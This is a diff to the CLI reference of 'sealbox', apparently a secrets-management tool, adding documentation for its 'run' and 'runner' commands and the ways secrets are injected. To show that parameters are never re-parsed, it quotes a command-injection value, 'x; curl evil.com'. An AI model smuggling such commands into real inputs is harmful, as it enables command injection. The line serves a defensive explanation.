@@ -1,9 +1,9 @@
 # CLI Reference
 
-> **Partly implemented.** `identity`, `audit`, `bootstrap`, the secret commands, and `grant` all
-> exist and are documented below as they actually behave. `run`, `rotate`, `runner`, and `admin`
-> describe the target and do not exist yet — a grant can be approved but not yet executed. See
-> [`README.md`](../README.md).
+> **Mostly implemented.** `identity`, `audit`, `bootstrap`, the secret commands, `grant`, `run`,
+> and `runner` all exist and are documented as they actually behave. `rotate` and `admin` describe
+> the target. Adapters are recognised but not yet implemented — a grant with a `script` runs
+> today. See [`README.md`](../README.md).
 
 One binary, `sealbox`, used by humans, agents, and the runner alike. What differs is the identity
 it authenticates as.
@@ -190,6 +190,52 @@ rotate-utopia-db
 
 **Two lines: everything that credential can do in this system.** In Vault, 1Password, or GitHub
 Secrets the answer is "anything, to anyone holding it".
+
+---
+
+## Running *(implemented, except adapters)*
+
+### `sealbox-cli run <grant> [key=value ...]`
+
+Submits a job, waits, and prints the exit status and whatever the implementation printed.
+**Never a secret value.**
+
+```bash
+sealbox-cli run k8s-sync
+sealbox-cli run k8s-restart deploy=api
+```
+
+A caller supplies a grant name and parameters — never a command. Parameters are substituted into
+the implementation's argv as whole tokens and are never re-parsed, so a parameter of
+`x; curl evil.com` arrives as one odd argument and nothing in it executes.
+
+### `sealbox-cli runner --name <name>`
+
+Claims jobs addressed to this runner, executes them, and reports back. **This is the only place a
+grant runs, and the only place a secret's plaintext exists outside the server.**
+
+```bash
+sealbox-cli runner --name prod-cluster
+```
+
+It dials out — the network it sits in needs no inbound port, no Ingress, and no public endpoint.
+
+A claim carries the implementation and the plaintext of **only** the secrets that grant declares.
+There is no endpoint, for any role, that fetches a secret by name.
+
+**Three injection forms**, from two fields on the grant:
+
+| Declared as | The implementation receives |
+|---|---|
+| `secrets` | each as an environment variable |
+| `secrets` | *also* all of them as a `KEY=value` file at `$SEALBOX_ENVFILE` — for `kubectl create secret --from-env-file` and the like |
+| `files` | each written to a `0600` file; the path is exported and substituted into argv as `{NAME}` |
+
+Everything lives in one temp directory removed when the job ends, including on failure.
+
+A job that is claimed and never reported is marked failed after ten minutes. **Nothing is
+retried**: a grant is not necessarily idempotent, and silently re-running a `CREATE USER` or a
+deployment is worse than failing. Resubmit when you have decided that is safe.
 
 ---
 
